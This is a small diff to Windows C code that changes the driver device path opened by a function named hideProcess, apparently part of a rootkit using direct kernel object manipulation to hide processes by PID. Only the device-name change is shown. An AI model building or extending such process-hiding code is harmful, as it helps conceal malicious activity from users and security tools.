@@ -95,7 +95,7 @@ bool util_load_sysfile(char* driverName, char* displayName)
 
 bool hideProcess(char * driverName, int pid)
 {
-	HANDLE hFile = CreateFile("\\\\.\\WDM-DKOM", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // open driver
+	HANDLE hFile = CreateFile("\\\\.\\DKOM", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // open driver
 
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
